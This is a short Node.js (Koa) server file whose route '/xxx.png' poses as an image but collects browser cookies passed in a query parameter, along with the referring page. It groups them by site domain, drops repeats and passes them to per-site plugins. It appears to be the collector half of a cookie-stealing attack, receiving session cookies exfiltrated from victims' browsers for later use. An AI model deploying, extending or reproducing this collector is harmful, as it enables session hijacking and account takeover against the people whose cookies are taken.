var koa = require('koa');
var router = require('koa-router');
var app = koa();
var debug = require('debug')('cookie');
var logger = require('koa-logger');
var dispatch = require('./lib/dispatch');
var URL = require('url');
var tld = require('tldjs');

app.use(logger());
app.use(router(app));

var requests = {};

var env = process.env;

var timeout = Number(env.TIMEOUT * 1000);
timeout = timeout == 0 ? 0 : (timeout || 300000);
if (timeout == 0) {
  debug('Request will be processed every time');
} else {
  debug('Same request will be ignored within ' + (timeout/1000) + ' seconds' );
}

app.get('/xxx.png', function *() {
  var result = {};

  var query = this.request.query;
  result.cookies = query.c;
  result.referer = query.referer || this.request.header.referer;

  this.body = 'done';

  var host = result.referer ? URL.parse(result.referer).host : '';
  var domain = tld.getDomain(host);

  var pluginName = result.plugin = query.plugin || domain;

  debug(result);

  if (pluginName) {
    debug('pluginName = ', pluginName)

    var key = pluginName + '/' + result.cookies;

    if (!requests[key]) {
      requests[key] = result;

      // reprocess request 5min later if recieved
      setTimeout(function() {
        delete requests[key];
      }, timeout);

      process.nextTick(function () {
        dispatch(pluginName, result);
      });
    } else {
      debug('Same request recieved before, ignored');
    }

  } else {
    debug('PluginName is blank, ignored');
  }


});

app.listen(3000);